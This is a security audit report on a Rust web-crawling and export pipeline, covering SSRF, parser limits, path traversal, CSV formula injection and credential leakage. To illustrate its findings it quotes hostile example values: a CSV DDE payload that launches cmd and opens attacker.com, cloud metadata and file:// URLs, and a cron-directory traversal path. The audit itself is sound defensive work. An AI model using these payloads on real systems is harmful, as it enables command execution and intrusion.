# Security Review: Census Pipeline

**Date:** 2026-09-25
**Scope:** `athletic-rust-pipeline` (commit `183fca13dd6d48165d04c76fd56648998e6b432f`)
**Reviewer:** SecurityReview-2
**Classification:** Read-only source audit. No code execution was performed.

---

## 1. Network Admission and SSRF

### F-SSRF-01 [material] — Redirects bypass admission control
- **Surface:** `crates/census-crawl/src/net/client.rs:39`
- **Trigger:** An admitted host (e.g., `athletic.net`) returns a 3xx redirect to an internal address (`http://169.254.169.254/latest/meta-data/ami-id`, `http://[::1]:8080/`, `http://localhost/`).
- **Where the check is:** `client.rs:39` configures `reqwest::redirect::Policy::limited(5)`. The robot.txt gate and origin admission run only against the *original* URL (`request_target`, `execute.rs:163-166`). Redirect targets are never re-admitted.
- **Impact:** If an admitted source is compromised or controlled by a hostile third party, the pipeline can be forced to make arbitrary HTTP requests from its network namespace, potentially reaching cloud metadata endpoints, internal services, or localhost-bound management interfaces.
- **Remedy:** Use `reqwest::redirect::Policy::custom()` to validate every redirect target against the origin policy and robots.txt before following it. Reject redirects to non-HTTP(S) schemes and to private IP ranges.

### F-SSRF-02 [material] — Browser origin check admits non-HTTP schemes
- **Surface:** `crates/census-crawl/src/net/bridge/lane.rs:126-141`
- **Trigger:** A URL such as `file:///etc/passwd` or `chrome://settings/` passes `Url::parse`, produces a `host_str()` of `""` or `"settings"`, which is then compared against `ADMITTED_BROWSER_ORIGINS`. An empty or mismatched host gets a rejection, but the check does not validate the scheme.
- **Where the check is:** `lane.rs:130-131` — only `host_str()` is compared; the scheme and authority are not validated.
- **Impact:** If `validate_origin` is ever bypassed or if a host matches (e.g., via subdomain confusion), a `file://` or `chrome://` URL could be navigated to, leaking local filesystem contents or browser internal pages.
- **Remedy:** Explicitly check `parsed.scheme() == "http" || parsed.scheme() == "https"` before the host comparison.

### F-SSRF-03 [hardening] — Relative links in fetched pages are not re-admitted
- **Surface:** HTML/JSON parsers in `crates/census-crawl/src/athleticnet/`, `crates/census-crawl/src/athleticlive/`, and other adapters.
- **Trigger:** A fetched page contains an absolute or relative URL in a `<link>`, `<a>`, JSON link field, or sitemap entry.
- **Where the check is:** No central URL-extraction gate. Each adapter builds its own URL list from page content.
- **Impact:** An attacker who controls any page content (via a compromised source or a successful SSRF from F-SSRF-01) could inject URLs to internal resources that are then fetched without admission checks.
- **Unchecked:** The specific URL extraction paths in all adapters were not exhaustively traced. A full audit of every URL-construction point would be needed.

---

## 2. Browser Control (CDP / DevTools)

### F-BROWSER-01 [material] — Interceptor script origin validation is correct but narrow
- **Surface:** `crates/athleticnet-browser/src/transport/rankings_helper/interceptor.rs:49`
- **Where the check is:** The injected JS checks `url.origin !== config.origin` and only intercepts specific API paths. This is correctly implemented.
- **Impact:** Low — the interceptor is well-bounded.
- **Note:** This is included because it was the *positive* example: the interceptor correctly validates origin before acting. Other surfaces lack equivalent checks.

### F-BROWSER-02 [hardening] — Browser navigates to redirect targets without re-admission
- **Surface:** `crates/athleticnet-browser/src/navigation/bootstrap.rs` (implicit via `Page::navigate`).
- **Trigger:** The source page redirects to an internal endpoint.
- **Where the check is:** Chromium's own redirect policy follows redirects. The `bootstrap` function navigates to the configured `target` URL; Chromium follows up to 20 redirects by default. No re-admission occurs.
- **Impact:** Same SSRF surface as F-SSRF-01 but via the browser lane. A compromised page could navigate Chromium to internal URLs and extract DOM content.
- **Remedy:** Monitor navigation events and intercept redirects that escape the admitted origin.

---

## 3. Parser and Archive Safety

### F-PARSER-01 [material] — Unbounded allocation in HTML-to-lines parser
- **Surface:** `crates/census-crawl/src/hytek/mod.rs:200-223`
- **Trigger:** An HTML body approaching 32 MiB (MAX_BODY_BYTES) with extremely short `<p>` tags or a single massive `<pre>` block.
- **Where the check is:** `lines_from_html` allocates `Vec<String>` for every line. There is no line-count ceiling.
- **Impact:** A hostile page could cause allocation of several hundred MB in the lines Vec alone, contributing to OOM. While the body is bounded, the expansion ratio (one HTML entity → one UTF-8 char → one line) is unbounded.
- **Remedy:** Cap the number of lines produced or use a streaming parser.

### F-PARSER-02 [hardening] — Manual HTML entity unescaping is fragile
- **Surface:** `crates/census-crawl/src/hytek/mod.rs:251-258`
- **Trigger:** A hostile page with deeply nested or extremely numerous HTML entities.
- **Where the check is:** The six explicit `replace` calls handle common entities. Unrecognized entities pass through as literal text. Entity expansion attacks (e.g., `&amp;amp;amp;...`) are not expanded recursively.
- **Impact:** Low — this is a fixed-column text report parser, not a general-purpose HTML renderer. The risk is limited to the six entities listed.

### F-PARSER-03 [hardening] — No explicit ZIP/XLSX bomb protection
- **Surface:** The project does not appear to accept uploaded ZIP or XLSX files from untrusted sources. The `calamine` crate (XLSX reader) is used only for reading the pipeline's own exported workbook (a verifier).
- **Where the check is:** N/A — no untrusted archive input surface was identified.
- **Impact:** If a seed workbook or external XLSX import is added, `calamine` would decompress without size limits. Add `calamine::Xlsx::with_max_rows` or a decompression cap at that point.

---

## 4. Store and Export Paths

### F-STORE-01 [material] — Workbook export path is not validated
- **Surface:** `crates/census-report/src/workbook/mod.rs:82-86`
- **Trigger:** `options.out` contains `../../etc/cron.d/exploit` or `../secrets.key`.
- **Where the check is:** The path is used directly as `options.out.clone().unwrap_or_else(...)`. No `path.clean()` or traversal check is performed.
- **Impact:** A hostile `options.out` value can write the workbook to any path the process has permissions for, potentially overwriting system files or placing executable content.
- **Remedy:** Validate `options.out` against path traversal (`Component::Normal` check) or constrain it to a known-writable directory.

### F-STORE-02 [hardening] — Sheet names are hardcoded constants
- **Surface:** `crates/census-report/src/workbook/recruiting/athletes.rs:73` (`"Athletes"`), `prs.rs:27` (`"PRs"`), `mod.rs:143-144` (`"Performances_{:03}"`).
- **Trigger:** N/A
- **Where the check is:** Sheet names are `const` or deterministic format strings.
- **Impact:** No injection risk from source data. This surface is safe.

### F-STORE-03 [hardening] — Backup manifest prevents path traversal
- **Surface:** `crates/census-store/src/backup/manifest.rs:98-110`
- **Where the check is:** `safe_entry_path` validates every path component is `Component::Normal`.
- **Impact:** This is correctly implemented. Backup entries cannot escape the backup directory.

### F-STORE-04 [hardening] — Fjall key separator is NUL; IDs cannot contain NUL
- **Surface:** `crates/census-store/src/keys.rs:36,43`
- **Where the check is:** IDs are deserialized from JSON (`keys.rs:86-106`) and checked for emptiness and length. JSON string deserialization fails on embedded NUL bytes, so a NUL byte in an ID is impossible through normal paths.
- **Impact:** No key collision vulnerability from source-controlled strings.

---

## 5. Workbook Injection (XLSX Formula Attack)

### F-WORKBOOK-01 [superseded — XLSX is safe; CSV is the live vector]
- **Surface:** `crates/census-report/src/workbook/cells.rs:177`
- **Verification:** Confirmed against vendored `rust_xlsxwriter 0.99.1` (`~/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/rust_xlsxwriter-0.99.1/src/worksheet.rs`).
  - `write_string` (line 2932) calls `store_string`, which delegates to `write_inline_string_cell` (line 19481).
  - Emitted XML for inline string: `<c r="A1" t="inlineStr"><is><t>VALUE</t></is></c>` (line 19507).
  - Shared-string variant: `<c r="A1" t="s"><v>INDEX</v></c>` (line 19468).
  - Neither emits a `<f>` (formula) element. Excel evaluates only cells with `<f>`; string cells are displayed literally regardless of content.
- **Where the check is:** N/A — the XLSX cell type `t="inlineStr"` or `t="s"` prevents formula execution. This surface is safe.
- **Impact:** An XLSX cell whose text begins with `=`, `+`, `-`, or `@` is safe in the workbook. **The real injection vector is CSV** (see F-WORKBOOK-02 below).


## 5.1 CSV Formula Injection (the live vector)

### F-WORKBOOK-02 [fixed] — CSV exports write third-party fields verbatim; Excel executes formula prefixes
- **Surface:** `crates/census-service/src/cli/export_data/csv.rs:32-35`
- **Trigger:** A third-party field (athlete name, school name, city, coach email, profile URL) begins with `=`, `+`, `-`, or `@`. Examples:
  - School name: `=1+1`
  - City: `+cmd|'C:\Windows\System32\cmd.exe'/c start http://attacker.com/`
  - Email: `@SUM(A1:Z100000)`
  - Profile URL: `-1=1`
- **Where the check is:** `write_record(row)` at `csv.rs:33-35` uses the `csv` crate's `Writer::write_record`. The `csv` crate only quotes fields containing commas, double quotes, or newlines; it does NOT quote fields starting with `=`, `+`, `-`, or `@`. Excel auto-detects these prefixes in CSV and evaluates them as formulas when opened.
- **Impact:** Analysts open `canonical-*.csv` or `recruiting-co2027.csv` in Excel and the formula executes. `+cmd|...` is a known Excel DDE attack vector that can launch arbitrary commands. `=HYPERLINK(...)` can open a malicious URL. CSV files are opened by analysts and recruiters directly — they are part of the deliverable.
- **Remedy (landed rule):** In `csv.rs:32-35`, before writing each field:
  - `=`, `+`, `@`, tab, CR at byte 0 → always prefix `'` (inert text escape).
  - `-` at byte 0 → prefix `'` ONLY when the field does not parse as a number. A legitimate negative number like `-5.25` evaluates to the same value as a formula and cannot execute; prefixing `'` would corrupt it for numeric consumers and display as text in Excel.
  - Everything else → untouched.
- **Priority:** Originally **blocking**. The escaping fix landed in `csv.rs:22-33` (`escape_field`), exercised by regression test `cli::export_data::csv::tests::csv_fields_are_safe_for_spreadsheets` (1 passed).


---

## 6. Secrets and Telemetry

### F-SECRETS-01 [material] — All response headers captured without redaction
- **Surface:** `crates/athleticnet-browser/src/response_wire.rs:33-43`
- **Trigger:** A response contains `Set-Cookie`, `Authorization`, `x-api-key`, or other sensitive headers.
- **Where the check is:** `headers::serialize` serializes the entire `HeaderMap` sorted by name, including every header. No filtering of sensitive header names occurs.
- **Impact:** Session cookies, auth tokens, and API keys from responses are stored in the captured evidence (JSON files on disk, potentially in version-controlled fixtures). This is a credential leakage vector.
- **Remedy:** Redact sensitive headers (`Set-Cookie`, `Authorization`, `Cookie`, `x-api-key`, `anettokens`) before writing to cache/evidence. The goal doc §19 requires this: "Credentials must not become durable evidence. Omit cookies, Set-Cookie, authorization headers, bearer/session tokens."

### F-SECRETS-02 [material] — Auth tokens embedded in request evidence
- **Surface:** `crates/census-crawl/src/athleticnet/meet/collect/`
- **Trigger:** `anettokens` JWT meet token (line 142-143 of `walk.rs`) is included in the request body.
- **Where the check is:** The token is passed as a request header and then stored as part of the source observation receipt.
- **Impact:** JWT tokens for meet data access are stored in the durable evidence, potentially in a directory that is versioned, backed up, or shared.
- **Remedy:** Redact or hash the token value in stored receipts. Use the token only for the request and do not persist it.

### F-SECRETS-03 [material] — Full URLs logged in tracing spans
- **Surface:** `crates/census-crawl/src/net/request.rs:15,26,54`
- **Trigger:** A URL contains query parameters with session tokens, pagination secrets, or other sensitive data.
- **Where the check is:** `#[tracing::instrument(..., fields(url, method = "GET"))]` records the full URL string in every log event. `tracing::Span::current().record("url", url)` at line 17 does the same.
- **Impact:** Query-string tokens and secrets appear in application logs. While the `checked` function in `request/build.rs` strips `username()`, `password()`, and `fragment`, query parameters are not sanitized.
- **Remedy:** Redact query parameters in logged URLs, or log only the origin + path without query string.

### F-SECRETS-04 [hardening] — HAR/cookie jar persistence
- **Surface:** `crates/athleticnet-browser/src/profile.rs:21` (`profile_dir: PathBuf`)
- **Trigger:** The browser uses a persistent Chromium profile directory for authentication cookies and local storage.
- **Where the check is:** `profile_dir` is an absolute path to the browser profile. Chromium stores session cookies, local storage, and potentially cached credentials there.
- **Impact:** If the profile directory is backed up or exposed (e.g., in a log, in a container image, or on a shared filesystem), session cookies for athletic.net are recovered.
- **Remedy:** Treat the profile directory as a secret. Ensure it is not included in backups, exports, or log output. The goal doc §19 requires access-controlled handling of token-bearing data.

---

## Summary

| Finding | Severity | Surface |
|---------|----------|---------|
| F-SSRF-01 | material | Redirects bypass admission |
| F-SSRF-02 | material | Browser URL scheme not validated |
| F-SSRF-03 | hardening | Relative links in pages un-admitted |
| F-BROWSER-01 | — | Interceptor validation correct (positive) |
| F-BROWSER-02 | hardening | Browser redirect follows without re-admission |
| F-PARSER-01 | material | Unbounded line allocation in HTML parser |
| F-PARSER-02 | hardening | Manual entity unescaping |
| F-PARSER-03 | hardening | No ZIP/XLSX bomb protection (no untrusted input yet) |
| F-WORKBOOK-01 | **superseded** | XLSX string cells are inert; formula prefixes are not executed (verified) |
| F-WORKBOOK-02 | **fixed** | CSV escaping landed — escape_field(csv.rs:22-33) + regression test passes (1 passed) |
| F-STORE-01 | material | Workbook export path not validated |
| F-STORE-02 | — | Sheet names hardcoded (positive) |
| F-STORE-03 | — | Backup path traversal blocked (positive) |
| F-STORE-04 | — | NUL separator safe (positive) |
| F-SECRETS-01 | material | Response headers captured unredacted |
| F-SECRETS-02 | material | Auth tokens stored in request evidence |
| F-SECRETS-03 | material | Full URLs logged including query params |
| F-SECRETS-04 | hardening | Browser profile dir is a persistent secret |

### Blocked findings
- ~~**F-WORKBOOK-01**~~: ~~The XLSX writer does not escape formula prefixes.~~ — Superseded. Verified against `rust_xlsxwriter 0.99.1` (`~/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/rust_xlsxwriter-0.99.1/src/worksheet.rs:19458-19511`): `write_string` emits `t="inlineStr"` or `t="s"` cells without `<f>` formula elements; Excel displays string cells literally.
- ~~**F-WORKBOOK-02**~~: ~~CSV exports write third-party fields verbatim~~ — Fixed. `csv.rs:22-33` `escape_field()` prefixes `'` for `=`, `+`, `@`, tab, CR at byte 0; for leading `-` only when `field.parse::<f64>().is_err()`. Regression test `cli::export_data::csv::tests::csv_fields_are_safe_for_spreadsheets` passes.

### Unchecked surfaces
The following were noted but could not be fully adjudicated without deeper tracing:

1. **Every URL extraction point across all adapters** — Each of the ~15 source adapters constructs URLs from page content (JSON fields, HTML attributes, regex groups). Tracing every path to confirm admission or origin validation is not exhaustive from the tree alone.
2. **Restate ingress security** — The browser lane is accessed via Restate ingress (`BrowserLane::answer` in `bridge/lane.rs`). The ingress transport security (TLS, auth) depends on the deployment configuration and is outside the repository tree.
3. **Fjall storage-level encryption** — The store writes data to JSONL files on disk. Whether these are encrypted at rest depends on filesystem-level encryption and is outside the scope of the code review.
4. **CDP endpoint exposure** — The CDP endpoint is validated to be loopback-only (`profile.rs:71-95`), but the actual Chromium launch flags and exposed CDP ports depend on the deployment manifest.
5. **Model server input validation** — The `census-review` crate communicates with local model servers. The input packets (athlete evidence) sent to models should be verified to not contain harmful payloads in the model's execution context.
6. **Dependency and license audits** — `cargo deny check` reports advisories/bans/licenses/sources all clear; `cargo audit --quiet` is silent. The §58 dependency and license verification items are satisfied on the current tree.
